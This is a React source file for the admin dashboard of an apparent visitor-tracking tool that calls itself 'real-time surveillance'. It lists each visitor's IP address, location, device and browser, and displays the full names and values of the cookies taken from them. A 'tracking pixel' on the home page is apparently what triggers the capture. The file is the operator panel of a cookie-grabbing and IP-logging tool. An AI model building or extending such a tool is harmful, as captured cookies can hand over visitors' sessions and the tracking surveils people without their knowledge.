import { useEffect, useMemo } from "react";
import { Link, useLocation } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import { format } from "date-fns";
import { useVisitors } from "@/hooks/use-visitors";
import { useAuth } from "@/hooks/use-auth";
import { Navbar } from "@/components/layout/Navbar";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { ScrollArea } from "@/components/ui/scroll-area";
import { 
  Users, Cookie, RefreshCw, Loader2, Globe, Laptop, 
  Smartphone, Terminal, MapPin, ExternalLink, Code
} from "lucide-react";

export default function Admin() {
  const { isAuthenticated, isLoading: isAuthLoading } = useAuth();
  const [, setLocation] = useLocation();
  const { data: visitors, isLoading, isRefetching, refetch } = useVisitors();

  useEffect(() => {
    if (!isAuthLoading && !isAuthenticated) {
      setLocation("/login");
    }
  }, [isAuthenticated, isAuthLoading, setLocation]);

  const stats = useMemo(() => {
    if (!visitors) return { total: 0, withCookies: 0 };
    
    const withCookies = visitors.filter(v => {
      if (!v.allCookies) return false;
      try {
        const parsed = typeof v.allCookies === 'string' ? JSON.parse(v.allCookies) : v.allCookies;
        return Object.keys(parsed).length > 0;
      } catch {
        return false;
      }
    }).length;
    
    return {
      total: visitors.length,
      withCookies
    };
  }, [visitors]);

  if (isAuthLoading || isLoading) {
    return (
      <div className="min-h-screen bg-background flex flex-col">
        <Navbar />
        <div className="flex-1 flex items-center justify-center">
          <Loader2 className="w-10 h-10 animate-spin text-sky-500" />
        </div>
      </div>
    );
  }

  if (!isAuthenticated) return null;

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <Navbar />
      
      <main className="flex-1 container mx-auto px-4 py-8">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8">
          <div>
            <h1 className="text-3xl font-display font-bold text-slate-100 flex items-center gap-3">
              Live Visitor Tracking
              {isRefetching && <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />}
            </h1>
            <p className="text-slate-400 mt-1">Real-time surveillance of incoming traffic</p>
          </div>
          
          <div className="flex items-center gap-3">
            <Button 
              variant="outline" 
              className="border-slate-700 bg-slate-800/50 hover:bg-slate-700 text-slate-200"
              onClick={() => refetch()}
              disabled={isRefetching}
            >
              <RefreshCw className={`w-4 h-4 mr-2 ${isRefetching ? 'animate-spin' : ''}`} />
              Refresh Data
            </Button>
            <Link href="/">
              <Button className="bg-sky-500 hover:bg-sky-400 text-slate-950 font-medium">
                <ExternalLink className="w-4 h-4 mr-2" />
                Simulate Visitor
              </Button>
            </Link>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
          <Card className="glass-card p-6 flex items-center gap-4">
            <div className="bg-sky-500/10 p-4 rounded-xl border border-sky-500/20">
              <Users className="w-6 h-6 text-sky-400" />
            </div>
            <div>
              <p className="text-sm font-medium text-slate-400">Total Visitors</p>
              <h3 className="text-2xl font-bold text-slate-100">{stats.total}</h3>
            </div>
          </Card>
          
          <Card className="glass-card p-6 flex items-center gap-4">
            <div className="bg-amber-500/10 p-4 rounded-xl border border-amber-500/20">
              <Cookie className="w-6 h-6 text-amber-400" />
            </div>
            <div>
              <p className="text-sm font-medium text-slate-400">Captured Cookies</p>
              <h3 className="text-2xl font-bold text-slate-100">{stats.withCookies}</h3>
            </div>
          </Card>
        </div>

        <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">
          <AnimatePresence>
            {visitors?.map((visitor, index) => {
              let cookiesRecord: Record<string, string> = {};
              try {
                if (typeof visitor.allCookies === 'string') {
                  cookiesRecord = JSON.parse(visitor.allCookies);
                } else if (visitor.allCookies && typeof visitor.allCookies === 'object') {
                  cookiesRecord = visitor.allCookies as Record<string, string>;
                }
              } catch (e) {
                // Ignore parse errors
              }

              const cookieEntries = Object.entries(cookiesRecord);
              const hasCookies = cookieEntries.length > 0;
              const isMobile = visitor.device?.toLowerCase() === 'mobile';

              return (
                <motion.div
                  key={visitor.id}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.3, delay: index * 0.05 }}
                >
                  <Card className="glass-card overflow-hidden hover:border-slate-600 transition-colors duration-300 h-full flex flex-col">
                    <div className="p-4 border-b border-slate-700/50 bg-slate-800/30 flex items-start justify-between">
                      <div>
                        <div className="flex items-center gap-2 mb-1">
                          <Badge variant="outline" className="bg-sky-500/10 text-sky-400 border-sky-500/20 font-mono text-xs">
                            #{visitor.id}
                          </Badge>
                          <h3 className="font-mono text-lg font-bold text-slate-100">
                            {visitor.ip}
                          </h3>
                        </div>
                        <p className="text-xs text-slate-400 flex items-center gap-1">
                          <Globe className="w-3 h-3" />
                          {visitor.visitTime ? format(new Date(visitor.visitTime), 'PPpp') : 'Unknown time'}
                        </p>
                      </div>
                      
                      <Link href={`/raw/${visitor.id}`}>
                        <Button variant="ghost" size="icon" className="text-slate-400 hover:text-sky-400 hover:bg-sky-500/10 h-8 w-8">
                          <Code className="w-4 h-4" />
                        </Button>
                      </Link>
                    </div>

                    <div className="p-4 grid grid-cols-2 gap-4 flex-1">
                      <div className="space-y-3">
                        <div>
                          <p className="text-xs text-slate-500 font-medium mb-1">LOCATION</p>
                          <div className="flex items-center gap-2 text-sm text-slate-300">
                            <MapPin className="w-4 h-4 text-rose-400" />
                            {visitor.location || 'Unknown'}
                          </div>
                        </div>
                        
                        <div>
                          <p className="text-xs text-slate-500 font-medium mb-1">ENVIRONMENT</p>
                          <div className="flex items-center gap-2 text-sm text-slate-300 mb-1">
                            {isMobile ? <Smartphone className="w-4 h-4 text-emerald-400" /> : <Laptop className="w-4 h-4 text-emerald-400" />}
                            {visitor.os}
                          </div>
                          <div className="flex items-center gap-2 text-sm text-slate-300">
                            <Terminal className="w-4 h-4 text-indigo-400" />
                            {visitor.browser} {visitor.browserVersion}
                          </div>
                        </div>
                      </div>

                      <div className="bg-slate-900/50 rounded-xl border border-slate-800 overflow-hidden flex flex-col">
                        <div className="p-2 border-b border-slate-800 bg-slate-800/20 flex justify-between items-center">
                          <span className="text-xs font-semibold text-slate-400 flex items-center gap-1">
                            <Cookie className="w-3 h-3 text-amber-400" /> COOKIES
                          </span>
                          <Badge variant="secondary" className="bg-slate-800 text-slate-300 text-[10px] px-1.5 py-0 h-4">
                            {cookieEntries.length}
                          </Badge>
                        </div>
                        
                        <ScrollArea className="flex-1 h-32">
                          {hasCookies ? (
                            <div className="p-2 space-y-1.5">
                              {cookieEntries.map(([key, val]) => (
                                <div key={key} className="text-[11px] font-mono leading-tight">
                                  <span className="text-amber-300 font-semibold">{key}: </span>
                                  <span className="text-emerald-300 break-all text-opacity-90">{val}</span>
                                </div>
                              ))}
                            </div>
                          ) : (
                            <div className="flex h-full items-center justify-center p-4">
                              <p className="text-xs italic text-rose-400/80">No cookies captured</p>
                            </div>
                          )}
                        </ScrollArea>
                      </div>
                    </div>
                  </Card>
                </motion.div>
              );
            })}
          </AnimatePresence>
          
          {visitors?.length === 0 && (
            <div className="col-span-full py-16 text-center">
              <div className="inline-flex bg-slate-800/50 p-4 rounded-full mb-4">
                <Users className="w-8 h-8 text-slate-500" />
              </div>
              <h3 className="text-lg font-medium text-slate-300 mb-2">No visitors tracked yet</h3>
              <p className="text-slate-500 max-w-md mx-auto">
                Visit the home page to trigger the tracking pixel and populate this dashboard.
              </p>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
